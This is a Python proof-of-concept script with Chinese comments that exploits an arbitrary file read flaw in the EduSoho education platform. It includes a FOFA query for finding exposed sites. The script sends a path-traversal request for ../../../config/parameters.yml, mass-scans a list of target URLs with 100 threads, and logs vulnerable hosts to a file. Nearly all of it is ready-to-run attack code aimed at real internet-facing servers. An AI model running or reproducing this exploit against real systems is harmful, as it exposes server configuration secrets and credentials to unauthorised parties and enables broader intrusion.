#教培系统EduSoho任意文件读取漏洞

#fofa语法：title="EduSoho"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
  ______    _        _____       _           
 |  ____|  | |      / ____|     | |          
 | |__   __| |_   _| (___   ___ | |__   ___  
 |  __| / _` | | | |\___ \ / _ \| '_ \ / _ \ 
 | |___| (_| | |_| |____) | (_) | | | | (_) |
 |______\__,_|\__,_|_____/ \___/|_| |_|\___/ 
                                                                                                                                                                                                                                                                                                                                                                                                                  
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="教培系统EduSoho")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close',
        'Cookie': 'PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77',
        'Upgrade-Insecure-Requests': '1'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,verify=False)
        if res.status_code == 200 and "parameters" in res.text:
            print(f"f[+]该url存在任意文件读取漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件读取漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()